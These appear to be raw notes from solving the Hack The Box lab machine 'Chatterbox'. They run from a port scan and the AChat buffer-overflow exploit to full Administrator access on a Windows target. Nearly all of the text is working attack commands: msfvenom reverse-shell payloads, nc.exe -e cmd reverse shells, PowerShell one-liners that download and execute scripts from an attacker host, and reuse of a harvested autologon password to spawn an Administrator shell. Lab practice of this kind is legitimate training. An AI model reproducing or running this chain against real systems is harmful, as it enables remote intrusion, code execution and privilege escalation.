PORT     STATE SERVICE    VERSION
9255/tcp open  tcpwrapped
9256/tcp open  tcpwrapped



https://www.speedguide.net/port.php?port=9256


Achat is vulnerable to a SEH-based stack buffer overflow, caused by improper bounds checking by AChat.exe. By sending a specially-crafted UDP packet to the default port 9256 to overwrite the SEH handler, a remote attacker could overflow a buffer and execute arbitrary code on the system or cause the application to crash.
References: [EDB-36056], [XFDB-100845]


kali@kali:~/htb/boxes/chatterbox/10.10.10.74$ searchsploit achat
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                                                                  | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                                                     | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                                                        | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                                                          | php/webapps/24647.txt
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results


msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python


msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 EXITFUNC=thread -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

kali@kali:~$ sudo nc -lvvvnp 443
listening on [any] 443 ...

connect to [10.10.14.2] from (UNKNOWN) [10.10.10.74] 49159
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred



sudo /usr/bin/impacket-smbserver share $(pwd)


net use \\10.10.14.2\share x:


/opt/privesc/windows/Windows-Exploit-Suggester/windows-exploit-suggester.py --database /opt/privesc/windows/Wind                                                                                                                                                               
ows-Exploit-Suggester/2020-12-09-mssb.xls -i sysinfo.txt


[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 


cp /opt/privesc/windows/windows-kernel-exploits/MS16-135/41015.exe .






[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*] 


powershell (new-object System.Net.WebClient).Downloadfile('http://10.10.14.2/nc.exe', 'nc.exe')


start /B nc.exe -e cmd 10.10.14.2 1337

powershell (new-object System.Net.WebClient).Downloadfile('http://10.10.14.2/JuicyPotato.exe', 'JuicyPotato.exe')


powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-LovelyPotato.ps1')

 msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=4444 --format exe -o rev.exe


https://github.com/TsukiCTF/Lovely-Potato
sleep $((10 * 60))


powershell (new-object System.Net.WebClient).Downloadfile('http://10.10.14.2/EoP.exe', 'EoP.exe')


https://github.com/ivanitlearning/Juicy-Potato-x86/releases


powershell (new-object System.Net.WebClient).Downloadfile('http://10.10.14.2/JuicyPotato-Static32.exe', 'JuicyPotato-Static32.exe')


powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1'); Invoke-AllChecks"


*] Checking for Autologon credentials in registry...


DefaultDomainName    :                                                         
DefaultUserName      : Alfred                                                  
DefaultPassword      : Welcome1!                                               
AltDefaultDomainName :                                                         
AltDefaultUserName   :                                                         
AltDefaultPassword   : 



powershell (new-object System.Net.WebClient).Downloadfile('http://10.10.14.2/winPEAS.bat', 'winpeas.bat')


$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Managment.Automation.PSCredential('Administrator', $SecPass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/shell.ps1')" -Credential $cred



powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/powershell-rev.ps1')


 msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -e -f powershell -o powershell-rev.ps1

 powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/powershell-rev.ps1')


 cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 

 powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1')




powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/privesc.ps1')





```
$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1')" -Credential $cred
```



Synopsis in the end:
- Use AChat buffer overflow
- Powershell is not stable, copy nishang /opt/nishang/Shells/ powershell reverse shell to be able to run powershell interactive
- Create secure password, we got from winPEAS autologin
- Run process as admin with same password, reverse powershell again for example





powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.6/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 1234"



iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.6/MS16-032.ps1')); Invoke-MS16-032

iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.6/39719.ps1')); Invoke-MS16-032
